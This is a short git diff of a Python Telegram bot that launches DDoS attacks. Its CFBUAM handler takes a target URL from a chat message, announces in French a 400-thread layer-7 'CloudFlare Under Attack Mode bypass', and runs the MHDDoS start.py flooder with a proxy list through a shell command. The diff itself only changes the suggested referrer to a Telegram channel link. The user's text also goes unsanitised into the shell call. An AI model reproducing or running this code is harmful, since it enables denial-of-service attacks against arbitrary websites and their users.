@@ -120,7 +120,7 @@ def CFB(update: Update, context: CallbackContext):
       
 def CFBUAM(update: Update, context: CallbackContext):
   url = update.message.text.replace('/CFBUAM', '')
-  update.message.reply_text(f"METHOD: CFBUAM L7 THREADS : 400\n\nCFBUAM: CloudFlare Under Attack Mode Bypass (Met un referrer : facebook.com//lesite.com ou un site du genre pour bypass) pour: {s} s")
+  update.message.reply_text(f"METHOD: CFBUAM L7 THREADS : 400\n\nCFBUAM: CloudFlare Under Attack Mode Bypass (Met un referrer : https://t.me/backbencher_0 ou un site du genre pour bypass) pour: {s} s")
   url_str = str(url)
   print(url_str)
   p = subprocess.Popen(f'python3 ~/MHDDoS/start.py CFBUAM {url_str} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
